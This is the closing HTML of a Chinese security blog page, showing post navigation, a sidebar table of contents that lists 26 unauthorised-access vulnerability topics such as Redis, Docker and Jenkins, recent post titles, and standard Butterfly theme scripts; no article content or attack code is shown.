class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/06/28/%E9%95%BF%E4%BA%AD%E9%9D%A2%E8%AF%95/" title="长亭蓝中面试"><img class="cover" src="/./img/11.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">长亭蓝中面试</div></div></a></div><div class="next-post pull-right"><a href="/2023/06/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="学习计划"><img class="cover" src="/./img/5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">学习计划</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/./img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">wangzhiii</div><div class="author-info__description">欢迎访问</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/wangzhi0013"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">1.redis未授权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-mongodb%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">2.mongodb未授权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">3.</span> <span class="toc-text">3.memcached未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-zookeeper%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">4.zookeeper未授权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">5.elasticsearch未授权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-kibana%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">6.kibana未授权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-docker-remote-api-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">7.</span> <span class="toc-text">7.docker remote api 未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-kubernetes-api-server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">8.</span> <span class="toc-text">8.kubernetes api server 未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">9.</span> <span class="toc-text">9.hadoop未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">10.</span> <span class="toc-text">10.jenkins未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-activeMQ%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">11.</span> <span class="toc-text">11.activeMQ未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-rabbitMQ%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.</span> <span class="toc-text">12.rabbitMQ未授权访问漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-sprintboot-actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">13.</span> <span class="toc-text">13.sprintboot actuator未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-FTP%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95%EF%BC%89"><span class="toc-number">14.</span> <span class="toc-text">14.FTP未授权访问漏洞（匿名登录）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15%E3%80%82jboss%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">15.</span> <span class="toc-text">15。jboss未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-ldap%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">16.</span> <span class="toc-text">16.ldap未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-rsync%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">17.</span> <span class="toc-text">17.rsync未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18%EF%BC%9Avnc%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">18.</span> <span class="toc-text">18：vnc未授权访问漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-dubbo%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">19.</span> <span class="toc-text">19.dubbo未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-nfs%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">20.</span> <span class="toc-text">20.nfs共享目录未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">21.</span> <span class="toc-text">21.druid未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-couchdb%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">22.</span> <span class="toc-text">22.couchdb未授权访问漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-atlassian-crowd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">23.</span> <span class="toc-text">23.atlassian crowd未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-jupyternotebook%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">24.</span> <span class="toc-text">24.jupyternotebook未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-windows-ipc-%E5%85%B1%E4%BA%AB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">25.</span> <span class="toc-text">25,windows ipc 共享未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26-rtsp%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">26.</span> <span class="toc-text">26.rtsp未授权访问</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/07/02/php%E5%86%85%E5%AD%98%E9%A9%AC/" title="php内存马学习"><img src="/./img/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php内存马学习"/></a><div class="content"><a class="title" href="/2023/07/02/php%E5%86%85%E5%AD%98%E9%A9%AC/" title="php内存马学习">php内存马学习</a><time datetime="2023-07-01T19:36:16.227Z" title="发表于 2023-07-02 03:36:16">2023-07-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/28/%E9%95%BF%E4%BA%AD%E9%9D%A2%E8%AF%95/" title="长亭蓝中面试"><img src="/./img/11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="长亭蓝中面试"/></a><div class="content"><a class="title" href="/2023/06/28/%E9%95%BF%E4%BA%AD%E9%9D%A2%E8%AF%95/" title="长亭蓝中面试">长亭蓝中面试</a><time datetime="2023-06-28T09:28:36.218Z" title="发表于 2023-06-28 17:28:36">2023-06-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/28/%E6%9C%AA%E6%8E%88%E6%9D%83/" title="未授权漏洞收集"><img src="/./img/11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="未授权漏洞收集"/></a><div class="content"><a class="title" href="/2023/06/28/%E6%9C%AA%E6%8E%88%E6%9D%83/" title="未授权漏洞收集">未授权漏洞收集</a><time datetime="2023-06-28T08:05:29.749Z" title="发表于 2023-06-28 16:05:29">2023-06-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="学习计划"><img src="/./img/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="学习计划"/></a><div class="content"><a class="title" href="/2023/06/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="学习计划">学习计划</a><time datetime="2023-06-27T13:26:12.611Z" title="发表于 2023-06-27 21:26:12">2023-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/23/weblogic/" title="weblogic漏洞笔记"><img src="/./img/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="weblogic漏洞笔记"/></a><div class="content"><a class="title" href="/2023/06/23/weblogic/" title="weblogic漏洞笔记">weblogic漏洞笔记</a><time datetime="2023-06-23T07:28:43.558Z" title="发表于 2023-06-23 15:28:43">2023-06-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/./img/11.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By wangzhiii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
